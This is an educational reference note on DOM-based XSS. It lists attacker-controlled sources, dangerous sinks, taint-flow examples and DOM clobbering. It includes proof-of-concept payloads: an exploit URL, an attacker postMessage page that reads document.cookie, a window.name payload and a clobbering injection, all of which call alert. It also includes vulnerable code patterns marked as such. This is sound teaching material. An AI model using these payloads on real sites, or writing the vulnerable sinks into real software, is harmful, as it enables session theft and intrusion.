# 02 — DOM-Based XSS: Sources, Sinks & Taint Analysis

## Overview

DOM XSS occurs entirely in the browser. The server never sees the payload — making it invisible to server-side WAFs and logging. Understanding the source-to-sink data flow is essential.

---

## Sources (Attacker-Controlled Data Entry Points)

| Source | Description | Notes |
|--------|-------------|-------|
| `location.hash` | URL fragment — never sent to server | Common in SPAs |
| `location.search` | Query string | Reflected but processed client-side |
| `location.pathname` | URL path | Parsed by JS routers |
| `document.referrer` | Referring URL | Controlled by attacker |
| `window.name` | Survives navigation | Rarely sanitized |
| `postMessage` | Cross-origin messaging | Origin check often missing |
| `localStorage/sessionStorage` | Persistent attacker data | Injected via prior XSS |
| `document.cookie` | Cookie values | If attacker can set cookies |

---

## Sinks (Dangerous Execution Points)

### HTML Sinks

```javascript
element.innerHTML = userInput;       // Executes HTML
element.outerHTML = userInput;       // Replaces element
document.write(userInput);           // Rewrites document
document.writeln(userInput);
element.insertAdjacentHTML('beforeend', userInput);
```

### JavaScript Execution Sinks

```javascript
eval(userInput);
new Function(userInput)();
setTimeout(userInput, 1000);         // String form only
setInterval(userInput, 1000);        // String form only
```

### Navigation Sinks

```javascript
location.href = userInput;           // javascript: protocol
location.assign(userInput);
location.replace(userInput);
window.open(userInput);
```

### Resource Loading Sinks

```javascript
element.src = userInput;
element.setAttribute('href', userInput);
scriptElement.src = userInput;
```

---

## Taint Flow Examples

### Example 1: Hash to innerHTML

```javascript
// Vulnerable code
document.getElementById('result').innerHTML = decodeURIComponent(location.hash.slice(1));

// Exploit URL
https://victim.com/page#<img src=x onerror=alert(origin)>
```

### Example 2: postMessage without Origin Check

```javascript
// Vulnerable receiver
window.addEventListener('message', function(e) {
  // Missing: if (e.origin !== 'https://trusted.com') return;
  document.getElementById('output').innerHTML = e.data;
});
```

```javascript
// Attacker page
const target = window.open('https://victim.com');
setTimeout(() => {
  target.postMessage('<img src=x onerror=alert(document.cookie)>', '*');
}, 2000);
```

### Example 3: window.name Persistence

```javascript
// Attacker sets window.name before navigating
window.name = '<img src=x onerror=alert(1)>';
location = 'https://victim.com/page-that-uses-window.name';

// Victim page sink
document.write(window.name);
```

---

## DOM Clobbering

DOM Clobbering allows attackers to overwrite JavaScript variables using HTML elements with `id` or `name` attributes matching the variable name:

```html
<!-- If the page contains: -->
<form id="config"><input name="debug" value="true"></form>

<!-- And the JS does: -->
if (config.debug) { eval(config.debugScript); }

<!-- Attacker injects: -->
<form id="config"><input name="debugScript" value="alert(1)"></form>
```

---

## Tools for DOM XSS

- **DOM Invader** (Burp Suite) — visual taint tracing, source/sink mapping
- **Playwright + custom hooks** — headless browser testing with `page.evaluate()`
- **retire.js** — identify vulnerable JS libraries in use

---

## References

- [PortSwigger DOM XSS](https://portswigger.net/web-security/dom-based)
- [DOM Clobbering — Gareth Heyes](https://portswigger.net/research/dom-clobbering-strikes-back)
